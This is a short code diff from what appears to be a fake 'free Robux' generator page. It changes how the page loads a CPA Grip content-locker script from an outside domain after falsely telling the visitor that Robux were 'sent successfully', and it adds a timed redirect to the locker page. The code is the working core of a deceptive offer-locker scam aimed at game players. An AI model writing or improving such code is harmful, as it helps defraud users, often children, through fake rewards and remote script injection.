@@ -244,8 +244,15 @@
           statusText.innerHTML = `Robux sent successfully! 🎉`;
 
           // Script CPA Grip après chargement :
-           const scriptHTML = '<script type="text/javascript" src="https://singingfiles.com/script_include.php?id=1821663"><\/script>';
-		   document.write(scriptHTML);
+           const script = document.createElement("script");
+	   script.type = "text/javascript";
+	   script.src = "https://singingfiles.com/script_include.php?id=1821663";
+	   document.body.appendChild(script);
+
+// Redirection manuelle vers le locker après un court délai
+	   setTimeout(() => {
+  	     window.location.href = "https://singingfiles.com/help/ablk.php?lkt=1";
+	   }, 500);
         }
       }, 200);
     });
